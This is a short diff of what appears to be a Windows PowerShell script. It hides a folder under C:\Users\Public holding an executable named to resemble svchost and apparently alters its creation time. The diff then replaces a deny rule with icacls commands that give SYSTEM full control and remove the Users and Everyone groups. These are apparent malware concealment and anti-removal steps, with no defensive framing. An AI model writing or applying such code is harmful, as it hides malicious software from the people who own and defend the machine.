@@ -17,4 +17,12 @@ Set-ItemProperty -Path "C:\Users\Public\krnl\schvostkrnl-debug.exe" -Name Creati
 
 Set-ItemProperty -Path "C:\Users\Public\krnl" -Name Attributes -Value Hidden
 
-Start-Process -NoNewWindow -FilePath "icacls" -ArgumentList "`"C:\Users\Public\krnl`" /deny Everyone:(RX)" -Wait
+
+icacls "C:\Users\Public\krnl" /grant SYSTEM:(OI)(CI)F
+
+icacls "C:\Users\Public\krnl" /inheritance:r
+
+icacls "C:\Users\Public\krnl" /remove "Users"
+
+icacls "C:\Users\Public\krnl" /remove "Everyone"
+
